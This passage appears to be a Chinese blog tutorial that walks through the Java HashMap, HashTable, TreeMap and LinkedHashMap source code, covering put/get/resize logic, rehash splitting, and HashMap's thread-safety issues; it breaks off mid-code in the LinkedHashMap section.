<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//putVal(..)是提供给put方法使用的方法</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> onlyIfAbsent 表示是否对旧值进行替换，为true时表示不替换</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> evict 表示table是否处于创建状态，false表示处于</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//hash==hash(key)HashMap的扰动函数</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//n为数组(桶)长度,i为桶的位序</span></span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="comment">//table未初始化或者长度为0，进行扩容</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">//通过(n-1)&amp;hash计算元素应该放入哪个桶中</span></span><br><span class="line">    <span class="comment">//此时p为桶i的第一个链表节点或root节点</span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        <span class="comment">//桶为空</span></span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//桶不为空</span></span><br><span class="line">        <span class="comment">//此时有三种情况</span></span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">//此时插入节点的hash值与key均相同</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="comment">//记录此时原有旧元素，后面会将新的值放入</span></span><br><span class="line">            e = p;</span><br><span class="line">        <span class="comment">//p为树节点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="comment">//p为链表节点</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//遍历链表在末端插入</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">//如果节点数量达到阈值，转化为红黑树</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//判断链表节点中key值与插入元素key值是否相等</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">//节点后移，用于遍历链表</span></span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//表示前面在桶中找到key，hash值与插入元素相等的节点</span></span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="comment">//根据所传参数决定是否替换旧值</span></span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            <span class="comment">//插入后回调，提供给linkedHashMap</span></span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">//大小大于阈值就扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    <span class="comment">//回调(主要在子类LinkedHashMap中使用)</span></span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><ol>
<li>判断当前桶中不为空，存在元素，并计算传入key的hash找到相应的桶位置</li>
<li>总是先对第一个元素进行判断，并判断链表存在多个元素</li>
<li>树节点查找/遍历链表查找</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">return</span> (e = getNode(hash(key), key)) == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">getNode</span><span class="params">(<span class="keyword">int</span> hash, Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; <span class="keyword">int</span> n; K k;</span><br><span class="line">    <span class="comment">//判断当前table确实存在元素</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (first = tab[(n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//first是根据传入key判断的数组位置</span></span><br><span class="line">        <span class="keyword">if</span> (first.hash == hash &amp;&amp; <span class="comment">// always check first node</span></span><br><span class="line">            ((k = first.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">return</span> first;</span><br><span class="line">        <span class="comment">//当前数组位置不止一个元素</span></span><br><span class="line">        <span class="keyword">if</span> ((e = first.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//树节点查找</span></span><br><span class="line">            <span class="keyword">if</span> (first <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                <span class="keyword">return</span> ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class="line">            <span class="comment">//遍历链表查找</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">return</span> e;</span><br><span class="line">            &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="resize扩容"><a href="#resize扩容" class="headerlink" title="resize扩容"></a>resize扩容</h3><blockquote>
<p>进行扩容，会伴随一次重新hash分配，并且会遍历hash表中所有元素，非常耗时，要尽量避免resize</p>
</blockquote>
<h4 id="什么时候扩容"><a href="#什么时候扩容" class="headerlink" title="什么时候扩容"></a>什么时候扩容</h4><ol>
<li>总个数达到阈值时会进行扩容</li>
<li>添加元素时<code>,putVal()</code>时进行扩容；</li>
<li>初始化时，并不会对table进行初始化，也不会进行扩容。而是通过<code>putVal()</code>方法进行扩容初始化table</li>
</ol>
<h4 id="扩容方法"><a href="#扩容方法" class="headerlink" title="扩容方法"></a>扩容方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">    <span class="comment">//定义新旧桶的个数与阈值</span></span><br><span class="line">    <span class="keyword">int</span> oldCap = (oldTab == <span class="keyword">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">    <span class="keyword">int</span> oldThr = threshold;</span><br><span class="line">    <span class="keyword">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//已经初始化数组了</span></span><br><span class="line">    <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//旧容量超过最大值不再扩容，随你去碰撞</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">            threshold = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span> oldTab;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//新容量为原来的俩倍</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                 oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">            newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//此时oldCap=0,对于已经指定threshold阈值,未初始化桶的数量capacity</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// initial capacity was placed in threshold</span></span><br><span class="line">        newCap = oldThr;</span><br><span class="line">    <span class="comment">//oldCap=0 &amp;&amp; oldThr=0 即构造时使用无参构造</span></span><br><span class="line">    <span class="keyword">else</span> &#123;               <span class="comment">// zero initial threshold signifies using defaults</span></span><br><span class="line">        newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">        newThr = (<span class="keyword">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//计算新容量下 新的阈值threshold</span></span><br><span class="line">    <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)newCap * loadFactor;</span><br><span class="line">        newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="keyword">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                  (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    threshold = newThr;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//下面是rehash过程</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">    <span class="comment">//新的table</span></span><br><span class="line">        Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[newCap];</span><br><span class="line">    table = newTab;</span><br><span class="line">    <span class="keyword">if</span> (oldTab != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//遍历旧table</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">            Node&lt;K,V&gt; e;</span><br><span class="line">            <span class="comment">//桶的头结点存在</span></span><br><span class="line">            <span class="keyword">if</span> ((e = oldTab[j]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                oldTab[j] = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">//只有头结点</span></span><br><span class="line">                <span class="keyword">if</span> (e.next == <span class="keyword">null</span>)</span><br><span class="line">                    <span class="comment">//rehash算法</span></span><br><span class="line">                    newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">				<span class="comment">//树节点</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    ((TreeNode&lt;K,V&gt;)e).split(<span class="keyword">this</span>, newTab, j, oldCap);</span><br><span class="line">                <span class="comment">//链表结点</span></span><br><span class="line">                <span class="keyword">else</span> &#123; <span class="comment">// preserve order</span></span><br><span class="line">                    <span class="comment">//定义俩个链表分别头尾节点</span></span><br><span class="line">                    <span class="comment">//lo链表代表留在原地的链表 </span></span><br><span class="line">                    <span class="comment">//li链表代表到高位的链表</span></span><br><span class="line">                    Node&lt;K,V&gt; loHead = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; hiHead = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="comment">//用于节点后移</span></span><br><span class="line">                    Node&lt;K,V&gt; next;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        next = e.next;</span><br><span class="line">                        <span class="comment">//oldCap==16-10000  15-1111</span></span><br><span class="line">                        <span class="comment">//由于hash算法为(n-1) &amp; hash，故桶位置计算为与操作之后取后4位</span></span><br><span class="line">                        <span class="comment">//但在扩容之后是原来的俩倍，即应该上升一位取16，即与取与操作的倒数第五位</span></span><br><span class="line">                        <span class="comment">//结果为1，链接到高位链表，结果为0，链接到原来链表</span></span><br><span class="line">                        <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (loTail == <span class="keyword">null</span>)</span><br><span class="line">                                loHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                loTail.next = e;</span><br><span class="line">                            loTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//等于1就重新散列</span></span><br><span class="line">                            <span class="keyword">if</span> (hiTail == <span class="keyword">null</span>)</span><br><span class="line">                                hiHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hiTail.next = e;</span><br><span class="line">                            hiTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> ((e = next) != <span class="keyword">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (loTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        loTail.next = <span class="keyword">null</span>;</span><br><span class="line">                        newTab[j] = loHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (hiTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        hiTail.next = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="comment">//hi链表的头结点链接到高位</span></span><br><span class="line">                        newTab[j + oldCap] = hiHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newTab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="rehash补充"><a href="#rehash补充" class="headerlink" title="rehash补充"></a>rehash补充</h4><p>假如现在容量为初始容量16，再假如5，21，37，53的hash自己（二进制），所以在oldTab中的存储位置就都是<code>hash &amp; （16 - 1）</code>【16-1就是二进制1111，就是取最后四位】，</p>
<ul>
<li>5 ：00000101</li>
<li>21：00010101</li>
<li>37：00100101</li>
<li>53：00110101</li>
</ul>
<p>四个数与（16-1）相与后都是0101,即原始链为：<code>5---&gt;21---&gt;37---&gt;53----&gt;null</code></p>
<p><strong>创建俩个链表</strong></p>
<ul>
<li><code>lo</code>就是扩容后仍然在原地的元素链表</li>
<li><code>hi</code>就是扩容后下标为<strong>原位置+原数组容量</strong>的元素链表，从而不需要重新计算hash。</li>
</ul>
<p>此时进入<code>do-while</code>循环，对链表节点进行<strong>遍历</strong>，判断是留下还是到新的链表</p>
<p>因为扩容后计算存储位置为<code>hash&amp;(32-1)(取后5位)</code>,但是并不需要再计算一次，此时<strong>判断左边新增的哪一位(第5位)是否为1即可判断此节点是留在原地lo还是到高位hi</strong></p>
<p><code>(e.hash &amp; oldCap) == 0</code> （oldCap是16也就是10000，相与即取新的那一位）</p>
<ul>
<li>5 ：00000101——————》0留在原地 lo链表</li>
<li>21：00010101——————》1移向高位 hi链表</li>
<li>37：00100101——————》0留在原地 lo链表</li>
<li>53：00110101——————》1移向高位 hi链表</li>
</ul>
<p><strong>为什么0就放在原位置，为1就要放在原位置+原数组容量位置？</strong></p>
<p>因为上面进行resize的时候，是将数组容量扩大了一倍，原计算位置取模的时候是通过length-1，那么现在与oldCap相与后，如果右边第5位是1，那就是增加了一个原数组的长度(因为原取模的时候是取4位)，所以如果右边第5位要是1的话，那新的位置就是原位置+原数组容量。</p>
<p>所以在1.8的情况下，<strong>resize 是不需要对原数组链表中的所有节点都进行再次hash，移动之后的节点的顺序也不会改变，而且在一定程度上也避免了1.7中死锁的发生</strong>。</p>
<h3 id="插入方式"><a href="#插入方式" class="headerlink" title="插入方式"></a>插入方式</h3><h4 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h4><p>在jdk8之前采用头插法，即新元素插入会类似压栈方式压入链表元素，元素顺序在每次元素插入都会发生改变</p>
<blockquote>
<p>开发者认为，后插入的元素会被更多的查询，提供查找效率</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/20200629102914309.png" alt="头插法的过程"></p>
<h4 id="头插法带来的问题"><a href="#头插法带来的问题" class="headerlink" title="头插法带来的问题"></a>头插法带来的问题</h4><p>jdk8之前扩容时，头插法会导致链表反转，在多线程下出现环形链表，导致取值时出现死循环</p>
<p>jdk8采用尾插法，扩容转移前后链表的顺序不变，保持之前节点的引用</p>
<p><strong>问题</strong></p>
<p>A线程和B线程同时向同一个下标位置插入节点，遇到容量不够开始扩容，重新hash,放置元素，使用头插法遍历到的元素放入头部，这样形成了环</p>
<p><img src="https://csn.damyoung.cn/20200629113847203.png" alt="在这里插入图片描述"></p>
<h3 id="遍历方式"><a href="#遍历方式" class="headerlink" title="遍历方式"></a>遍历方式</h3><h4 id="entrySet"><a href="#entrySet" class="headerlink" title="entrySet"></a>entrySet</h4><p>Set&lt;Map .Entry&lt;K,V&gt;&gt;  entrySet();</p>
<blockquote>
<p>返回的是集合<strong>键值对的集合</strong>,使用Set进行接收，不需要进行强转</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set&lt;Map.Entry&gt; entries=map.entrySet();</span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:entries)&#123;</span><br><span class="line">    System.out.println(entry.getKey()+<span class="string">&quot;--&quot;</span>+entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="keySet"><a href="#keySet" class="headerlink" title="keySet"></a>keySet</h4><p>获取键的set集合，values() 获取值的collection集合</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set s=map.keySet();</span><br><span class="line">Collection s1=map.values();</span><br><span class="line">System.out.println(s1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(Object key:map.keySet())&#123;</span><br><span class="line">    System.out.println(key+<span class="string">&quot;--&quot;</span>+map.get(key));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="HashMap线程不安全"><a href="#HashMap线程不安全" class="headerlink" title="HashMap线程不安全"></a>HashMap线程不安全</h2><h3 id="put的时候导致多线程数据的不一致"><a href="#put的时候导致多线程数据的不一致" class="headerlink" title="put的时候导致多线程数据的不一致"></a>put的时候导致多线程数据的不一致</h3><p>俩个线程A和B，首先A希望插入一个key-value对到HashMap中，首先计算记录要落到的桶的索引坐标，然后获取到桶里面的链表头结点，此时线程A的时间片用完了，此时线程B得到调度得以执行，与A不同的是B成功将记录插入到桶中</p>
<p>假设线程A插入的记录计算出来的桶索引和线程B要插入的记录计算出来的桶索引是一样的，那B 成功插入之后，线程A再次被调度运行时，它依然持有过期的链表头但是它对此一无所知，以至于它认为它应该这样做，如此一来就覆盖了线程 B 插入的记录，这样线程B插入的记录就凭空消失了，造成了数据不一致的行为。</p>
<h3 id="多线程下Rehash导致的死循环问题"><a href="#多线程下Rehash导致的死循环问题" class="headerlink" title="多线程下Rehash导致的死循环问题"></a>多线程下Rehash导致的死循环问题</h3><p>主要原因在于并发下的<code>Rehash</code>会造成元素之间会形成一个<strong>循环链表</strong>。不过，jdk 1.8 后解决了这个问题，在 1.8 的情况下，resize 是不需要对原数组链表中的所有节点都进行再次 hash，<strong>移动之后节点的顺序也不会改变，而且在一定程度上也避免了1.7中死锁的发生</strong></p>
<p>并发环境下推荐使用 <code>ConcurrentHashMap</code>。</p>
<h2 id="HashMap和HashTable的区别"><a href="#HashMap和HashTable的区别" class="headerlink" title="HashMap和HashTable的区别"></a>HashMap和HashTable的区别</h2><ol>
<li><p>线程是否安全</p>
<p>HashMap是线程不安全，HashTable是线程安全。HashTable内部都是用<code>Synchronized</code>修饰的。</p>
<p>（要保证线程安全可以使用<code>ConcurrentHashMap</code>）</p>
</li>
<li><p>效率</p>
<p>由于线程安全问题，hashMap要比hashTable效率要高一些</p>
</li>
<li><p>对Null key 和Null value的支持</p>
<ul>
<li><p>HashMap中，null可以作为key，但这样的键只能有一个；同时可以作为一个或多个key的value;</p>
</li>
<li><p>HashTable中，put键值时只要有一个null,就会抛出<code>NullPointException</code></p>
</li>
</ul>
</li>
<li><p>初始容量和扩容容量不同</p>
<ul>
<li>HashMap默认容量为16，若指定容量会将其扩充为2的幂次方大小；每次扩容容量变为原来的俩倍</li>
<li>HashTable默认容量为11，若指定容量直接使用给定大小；每次扩容容量变为原来的<code>2n+1</code></li>
</ul>
</li>
<li><p>底层数据结构</p>
<p>jdk8以后hashMap在解决哈希冲突时有很大的变化，当链表长度大于阈值(默认为8)时，就会将链表转化为红黑树，减少搜索时间。</p>
<p>HashTable没有这样的数据结构</p>
</li>
</ol>
<h2 id="HashMap在jdk8的变化"><a href="#HashMap在jdk8的变化" class="headerlink" title="HashMap在jdk8的变化"></a>HashMap在jdk8的变化</h2><table>
<thead>
<tr>
<th></th>
<th align="center">jdk7</th>
<th align="center">jdk8</th>
</tr>
</thead>
<tbody><tr>
<td>底层数据结构</td>
<td align="center">数组+链表</td>
<td align="center">数据+链表/红黑树</td>
</tr>
<tr>
<td>插入方式</td>
<td align="center">头插法</td>
<td align="center">尾插法</td>
</tr>
<tr>
<td>扩容方式</td>
<td align="center">重新hash</td>
<td align="center">原位置&amp;原位置+原数组长度</td>
</tr>
<tr>
<td>插入流程</td>
<td align="center">判断扩容，再插入</td>
<td align="center">先插入，再判断扩容</td>
</tr>
<tr>
<td>节点类型</td>
<td align="center">Entry节点</td>
<td align="center">Node节点</td>
</tr>
</tbody></table>
<h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><p>TreeMap是按照 Key 的自然顺序或者<code>Comprator</code>的顺序进行排序，内部是通过红黑树来实现。</p>
<p>所以要么key所属的类实现<code>Comparable</code>接口，或者自定义一个实现了<code>Comparator</code>接口的比较器，传给<code>TreeMap</code>用于key的比较</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;? <span class="keyword">super</span> K&gt; comparator;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造方法传入自定义的比较器</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TreeMap</span><span class="params">(Comparator&lt;? <span class="keyword">super</span> K&gt; comparator)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.comparator = comparator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    Entry&lt;K,V&gt; t = root;</span><br><span class="line">    <span class="keyword">if</span> (t == <span class="keyword">null</span>) &#123;</span><br><span class="line">        compare(key, key); <span class="comment">// type (and possibly null) check</span></span><br><span class="line"></span><br><span class="line">        root = <span class="keyword">new</span> Entry&lt;&gt;(key, value, <span class="keyword">null</span>);</span><br><span class="line">        size = <span class="number">1</span>;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cmp;</span><br><span class="line">    Entry&lt;K,V&gt; parent;</span><br><span class="line">    <span class="comment">// split comparator and comparable paths</span></span><br><span class="line">    <span class="comment">//用于判断comparator==null?</span></span><br><span class="line">    <span class="comment">//1.不为空则，使用自定义的比较器进行排序(compare())</span></span><br><span class="line">    <span class="comment">//2.为空则，使用key自身是否实现的comparable接口定义的排序方法来排序(compareTo)</span></span><br><span class="line">    Comparator&lt;? <span class="keyword">super</span> K&gt; cpr = comparator;</span><br><span class="line">    <span class="keyword">if</span> (cpr != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            parent = t;</span><br><span class="line">            cmp = cpr.compare(key, t.key);</span><br><span class="line">            <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>)</span><br><span class="line">                t = t.left;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>)</span><br><span class="line">                t = t.right;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> t.setValue(value);</span><br><span class="line">        &#125; <span class="keyword">while</span> (t != <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Comparable&lt;? <span class="keyword">super</span> K&gt; k = (Comparable&lt;? <span class="keyword">super</span> K&gt;) key;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            parent = t;</span><br><span class="line">            cmp = k.compareTo(t.key);</span><br><span class="line">            <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>)</span><br><span class="line">                t = t.left;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>)</span><br><span class="line">                t = t.right;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> t.setValue(value);</span><br><span class="line">        &#125; <span class="keyword">while</span> (t != <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Entry&lt;K,V&gt; e = <span class="keyword">new</span> Entry&lt;&gt;(key, value, parent);</span><br><span class="line">    <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>)</span><br><span class="line">        parent.left = e;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        parent.right = e;</span><br><span class="line">    fixAfterInsertion(e);</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedHashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">HashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//双向链表的头节点</span></span><br><span class="line">    <span class="keyword">transient</span> LinkedHashMap.Entry&lt;K,V&gt; head;</span><br><span class="line">    <span class="comment">//双向链表的尾节点</span></span><br><span class="line">    <span class="keyword">transient</span> LinkedHashMap.Entry&lt;K,V&gt; tail;</span><br><span class="line">    <span class="comment">//决定了顺序</span></span><br><span class="line">    <span class="comment">//true--LRU顺序(最少使用淘汰算法)</span></span><br><span class="line">    <span class="comment">//false-- 插入顺序</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> accessOrder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//accessOrder默认为false</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedHashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        accessOrder = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 